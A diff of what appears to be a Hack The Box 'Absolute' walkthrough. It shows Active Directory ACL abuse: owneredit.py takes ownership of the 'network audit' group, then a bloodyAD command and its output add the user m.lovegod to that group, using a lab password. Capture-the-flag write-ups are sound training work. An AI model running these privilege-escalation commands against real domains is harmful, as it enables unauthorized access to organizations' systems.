@@ -499,7 +499,7 @@ This user is now compromised!
 
 I have WriteOwner over a group
 
-# Abusing `WriteOwner`
+# Abusing `WriteOwner` on the `network audit` group
 
 ```python
 faketime -f +7h owneredit.py -action write -new-owner 'm.lovegod' -target-dn 'CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB' 'absolute.htb'/m.lovegod:'AbsoluteLDAP2022!' -k -dc-ip 10.129.232.60
@@ -529,6 +529,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then ill grant myself the permission to add members
 
 ```python
-
+bloodyAD --host dc.absolute.htb -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k add groupMember 'network audit' 'm.lovegod'
+Clock skew detected. Adjusting local time by 6:59:54.678161. Retrying operation.
+[+] m.lovegod added to network audit
 ```
+
+Then ill add myself to the group
+
+![](Pasted%20image%2020260816193025.png)
+
+
 
